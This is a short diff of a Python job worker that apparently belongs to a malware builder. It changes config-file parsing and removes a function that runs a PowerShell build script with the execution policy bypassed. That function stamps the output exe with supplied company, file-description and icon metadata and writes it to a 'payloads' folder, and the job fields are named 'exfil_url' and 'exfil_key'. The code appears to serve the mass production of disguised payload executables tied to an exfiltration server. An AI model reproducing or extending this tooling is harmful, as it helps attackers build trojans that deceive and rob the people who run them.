@@ -46,8 +46,10 @@ def load_config(repo_root: str) -> dict:
         with open(config_path, encoding="utf-8") as f:
             for line in f:
                 line = line.strip()
-                if m := line.split("=", 1) if "=" in line else None:
-                    cfg[m[0].strip()] = m[1].strip()
+                if line.startswith("#") or "=" not in line:
+                    continue
+                k, v = line.split("=", 1)
+                cfg[k.strip()] = v.strip()
     return cfg
 
 
@@ -110,38 +112,6 @@ def download_icon(server: str, key: str, job_id: str, icon_ext: str) -> str | No
     with open(icon_path, "wb") as f:
         f.write(data)
     return icon_path
-
-
-def run_build(repo_root: str, job: dict) -> str:
-    """Run build_windows.ps1 and return path to output exe."""
-    ps1 = os.path.join(repo_root, "build_windows.ps1")
-    if not os.path.exists(ps1):
-        raise RuntimeError(f"build_windows.ps1 not found at {ps1}")
-
-    cmd = [
-        "powershell", "-ExecutionPolicy", "Bypass", "-File", ps1,
-        "-Preset",  job["preset"],
-        "-ExeName", job["exe_name"],
-    ]
-    if job.get("company"):   cmd += ["-Company",  job["company"]]
-    if job.get("file_desc"): cmd += ["-FileDesc", job["file_desc"]]
-
-    # Download custom icon if the job has one
-    icon_path = None
-    if job.get("icon_ext"):
-        icon_path = download_icon(job["exfil_url"] if "://" in job.get("exfil_url","") else "",
-                                  job["exfil_key"], job["id"], job["icon_ext"])
-    # icon_path injected via caller since we need server/key — handled below
-
-    result = subprocess.run(cmd, capture_output=True, text=True, cwd=repo_root)
-
-    exe_path = os.path.join(repo_root, "payloads", job["exe_name"] + ".exe")
-    if not os.path.exists(exe_path):
-        stderr = (result.stderr or "")[-1500:]
-        stdout = (result.stdout or "")[-500:]
-        raise RuntimeError(f"Build produced no exe.\n{stderr}\n{stdout}")
-
-    return exe_path
 
 
 def process_job(server: str, key: str, repo_root: str, job: dict):
